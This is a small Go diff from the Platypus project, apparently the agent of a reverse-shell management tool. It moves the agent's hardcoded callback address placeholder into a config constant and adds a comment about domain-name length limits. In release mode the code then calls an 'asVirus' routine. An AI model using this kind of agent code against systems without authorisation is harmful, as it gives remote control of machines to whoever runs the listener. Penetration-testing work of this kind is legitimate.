@@ -19,6 +19,7 @@ import (
 	"syscall"
 	"time"
 
+	"github.com/WangYihang/Platypus/internal/util/config"
 	"github.com/WangYihang/Platypus/internal/util/crypto"
 	"github.com/WangYihang/Platypus/internal/util/hash"
 	"github.com/WangYihang/Platypus/internal/util/log"
@@ -789,9 +790,14 @@ func asVirus() {
 func main() {
 	release := true
 	service := "127.0.0.1:13337"
-
+	/*
+		Each element of a domain name separated by [.] is called a “label.”
+		The maximum length of each label is 63 characters, and a full domain
+		name can have a maximum of 253 characters.
+	*/
+	// Remote address string placeholder
 	if release {
-		service = strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
+		service = strings.Trim(config.RemoteAddrPlaceHolder, " ")
 		asVirus()
 	}
 
